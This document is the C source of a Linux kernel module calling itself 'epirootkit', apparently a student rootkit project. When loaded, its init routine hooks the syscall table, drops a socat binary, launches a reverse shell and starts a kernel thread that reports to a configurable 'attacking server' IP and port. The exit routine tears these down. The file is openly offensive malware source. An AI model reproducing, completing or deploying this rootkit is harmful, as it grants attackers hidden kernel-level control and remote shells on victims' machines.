#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/uaccess.h>

#include "epirootkit.h"

struct task_struct *network_thread = NULL;
bool thread_exited = false;

char *ip = SERVER_IP;
int port = SERVER_PORT;
char *message = CONNEXION_MESSAGE;

module_param(ip, charp, 0644);
module_param(port, int, 0644);
module_param(message, charp, 0644);

MODULE_PARM_DESC(ip, "IPv4 of attacking server");
MODULE_PARM_DESC(port, "Port of attacking server");
MODULE_PARM_DESC(message, "Message to send to the attacking server");

/**
 * @brief Initializes the epirootkit module.
 *
 * @return Returns 0 (SUCCESS) on successful initialization, or a negative
 * error code if the kernel thread fails to start.
 */
static int __init epirootkit_init(void)
{
	pr_info("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");

	// Initalize hooks for the syscall table
	int err;
	err = fh_install_hooks(hooks, hook_array_size);
    if (err)
    {
        printk(KERN_ERR "my_module: failed to install hooks: %d\n", err);
        return err;
    }

	// Init structure for exec_code_stds
	// code: return code of the command
	// std_out: output of the command
	// std_err: error output of the command
	if(init_exec_result() != SUCCESS) {
		pr_err("epirootkit: epirootkit_init: memory allocation failed\n");
		return -ENOMEM;
	}

	if(drop_socat_binaire() != SUCCESS) {
		pr_err("epirootkit: epirootkit_init: failed to drop socat binary\n");
		return -FAILURE;
	}

	launch_reverse_shell();

	// Start a kernel thread that will handle network communication
	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
	if (IS_ERR(network_thread)) {
		pr_err("epirootkit: epirootkit_init: failed to start thread\n");
		return PTR_ERR(network_thread);
	}

	return SUCCESS;
}

/**
 * @brief Cleanup function called when the module is unloaded.
 *
 * This function is executed during the module's exit phase. 
 */
static void __exit epirootkit_exit(void)
{
	stop_reverse_shell();

	if (network_thread) {
		if (!thread_exited)
			kthread_stop(network_thread);
		pr_info("epirootkit: close_thread: thread stopped\n");
	}

	close_socket();

	// Remove hooks from the syscall table
	fh_remove_hooks(hooks, hook_array_size);

	pr_info("epirootkit: epirootkit_exit: module unloaded\n");
}


module_init(epirootkit_init);
module_exit(epirootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("STDBOOL");
MODULE_DESCRIPTION("MTF Rootkit - EPI Rootkit");